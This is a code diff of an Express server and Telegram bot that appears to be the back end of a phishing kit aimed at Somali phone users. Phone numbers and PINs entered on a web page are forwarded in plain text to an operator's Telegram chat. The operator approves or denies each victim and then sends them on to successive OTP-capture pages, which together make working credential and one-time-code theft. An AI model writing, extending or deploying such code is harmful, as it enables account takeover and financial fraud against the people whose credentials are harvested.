@@ -7,16 +7,47 @@ const app = express();
 const PORT = process.env.PORT || 8080;
 
 // -------------------- INIT BOT --------------------
+if (!process.env.BOT_TOKEN) {
+    throw new Error("BOT_TOKEN is missing in .env");
+}
+
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
+
+// -------------------- MEMORY STORE --------------------
 const statusStore = {};
 
+// -------------------- MIDDLEWARE --------------------
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
+
+// -------------------- ROUTES --------------------
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.get('/:page', (req, res) => {
+    if (req.params.page.startsWith('api')) {
+        return res.status(404).send("Not found");
+    }
+
+    const file = req.params.page.endsWith('.html')
+        ? req.params.page
+        : req.params.page + '.html';
+
+    const filePath = path.join(__dirname, 'public', file);
+
+    res.sendFile(filePath, (err) => {
+        if (err) {
+            res.status(404).send("Page not found");
+        }
+    });
+});
 
 // -------------------- LOGIN API --------------------
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
+
     const country = "Somalia";
     const countryCode = "+252";
 
@@ -56,13 +87,13 @@ app.post('/api/login-notification', async (req, res) => {
                     [
                         {
                             text: "✅ Allow to Proceed",
-                            callback_data: `allow_to_proceed_${phone}_${pin}`
+                            callback_data: `approve_${phone}_${pin}`
                         }
                     ],
                     [
                         {
                             text: "❌ Invalid Information",
-                            callback_data: `invalid_information_${phone}`
+                            callback_data: `deny_${phone}`
                         }
                     ]
                 ]
@@ -72,7 +103,7 @@ app.post('/api/login-notification', async (req, res) => {
         res.json({ success: true });
 
     } catch (err) {
-        console.error(err.message);
+        console.error(err);
         res.status(500).json({ error: "Telegram error" });
     }
 });
@@ -80,7 +111,7 @@ app.post('/api/login-notification', async (req, res) => {
 // -------------------- BOT ACTIONS --------------------
 
 // APPROVE
-bot.action(/allow_to_proceed_(.+)_(.+)/, async (ctx) => {
+bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
 
@@ -95,37 +126,40 @@ bot.action(/allow_to_proceed_(.+)_(.+)/, async (ctx) => {
 
     const approvedMsg =
         `✅ <b>LOGIN APPROVED</b>\n\n` +
+        `🆕 <b>NEW USER</b>\n` +
+        `🇸🇴 <b>Somalia</b>\n` +
         `📱 <b>${phone}</b>\n` +
         `🔐 <b>${pin}</b>\n\n` +
         `━━━━━━━━━━━━━━━\n\n` +
-        `➡️ <b>Next: OTP Page</b>\n` +
+        `✅ <b>Status: Approved</b>\n` +
+        `➡️ <b>Next: First OTP (1/2)</b>\n` +
         `⏱️ <b>${currentTime}</b>`;
 
     try {
         await ctx.replyWithHTML(approvedMsg);
-        await ctx.answerCbQuery("Allowed");
+        await ctx.answerCbQuery("Allowed to proceed");
     } catch (e) {
         console.error(e.message);
     }
 });
 
-// INVALID
-bot.action(/invalid_information_(.+)/, async (ctx) => {
+// DENY
+bot.action(/deny_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
 
     statusStore[phone] = "denied";
 
     try {
         await ctx.replyWithHTML(
-            `❌ <b>INVALID INFORMATION</b>\n\n📱 ${phone}\n⚠️ Try again`
+            `❌ <b>INVALID INFORMATION</b>\n\n📱 <b>User:</b> ${phone}\n\n⚠️ <b>User must re-enter PIN.</b>`
         );
-        await ctx.answerCbQuery("Invalid");
+        await ctx.answerCbQuery("Invalid information");
     } catch (e) {
         console.error(e.message);
     }
 });
 
-// -------------------- CHECK STATUS --------------------
+// -------------------- STATUS CHECK --------------------
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone;
 
